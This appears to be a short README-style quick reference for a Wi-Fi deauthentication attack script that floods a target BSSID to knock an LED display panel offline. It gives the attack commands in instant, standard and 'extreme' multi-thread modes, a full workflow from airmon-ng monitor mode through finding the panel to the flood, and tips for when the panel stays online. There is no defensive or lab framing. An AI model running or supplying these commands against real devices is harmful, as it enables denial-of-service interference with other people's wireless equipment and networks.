# ⚡ QUICK POWER ATTACK REFERENCE

## 🚀 INSTANT KILL (Recommended for Stubborn Panels)

```bash
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --instant
```

**Sends 12,000+ packets immediately - Panel goes down INSTANTLY!**

---

## 🔥 Standard POWER Attack

```bash
sudo python3 power_deauth.py -i wlan0mon -t <BSSID>
```

**5 parallel threads, 1000+ packets/second - Panel goes down in seconds!**

---

## 💀 EXTREME Mode (If Still Not Working)

```bash
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --threads 10
```

**10 parallel threads, 2000+ packets/second - MAXIMUM DESTRUCTION!**

---

## 📋 Complete Workflow

```bash
# 1. Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 2. Find LED panel
sudo python3 find_led_panel.py wlan0mon 30

# 3. INSTANT KILL
sudo python3 power_deauth.py -i wlan0mon -t <BSSID> --instant
```

---

## ⚠️ If Panel Still Not Down

1. **Get closer** to the LED panel
2. **Set correct channel**: `sudo iwconfig wlan0mon channel <channel>`
3. **Use EXTREME mode**: `--threads 10`
4. **Verify BSSID** is correct
5. **Check monitor mode**: `iwconfig wlan0mon | grep Mode`

---

**The POWER script is 100x faster than the regular script!** 🔥

